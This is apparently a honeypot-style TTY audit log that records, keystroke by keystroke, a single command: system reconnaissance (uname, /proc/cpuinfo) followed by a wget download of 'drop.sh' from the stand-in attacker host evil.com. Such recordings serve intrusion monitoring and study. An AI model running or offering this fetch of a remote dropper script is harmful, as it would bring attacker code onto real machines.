=== CHAMELEON TTY AUDIT TRAIL [SESSION: 981e0a74c79eedbc] ===
Started at: 2026-10-08T18:15:50Z

[0000.000s] u
[0000.000s] n
[0000.000s] a
[0000.000s] m
[0000.000s] e
[0000.000s]  
[0000.000s] -
[0000.000s] a
[0000.000s] ;
[0000.001s]  
[0000.001s] c
[0000.001s] a
[0000.001s] t
[0000.001s]  
[0000.001s] /
[0000.001s] p
[0000.001s] r
[0000.001s] o
[0000.001s] c
[0000.001s] /
[0000.001s] c
[0000.001s] p
[0000.001s] u
[0000.001s] i
[0000.001s] n
[0000.001s] f
[0000.001s] o
[0000.001s] ;
[0000.001s]  
[0000.001s] w
[0000.001s] g
[0000.001s] e
[0000.001s] t
[0000.001s]  
[0000.001s] h
[0000.001s] t
[0000.001s] t
[0000.001s] p
[0000.001s] :
[0000.001s] /
[0000.001s] /
[0000.001s] e
[0000.001s] v
[0000.001s] i
[0000.001s] l
[0000.001s] .
[0000.001s] c
[0000.001s] o
[0000.001s] m
[0000.001s] /
[0000.001s] d
[0000.001s] r
[0000.001s] o
[0000.001s] p
[0000.001s] .
[0000.001s] s
[0000.001s] h
[0000.001s] <CR>
[0000.001s] >>> COMMAND EXECUTED: "uname -a; cat /proc/cpuinfo; wget http://evil.com/drop.sh"

=== SESSION TERMINATED AT 2026-10-08T18:15:54Z ===
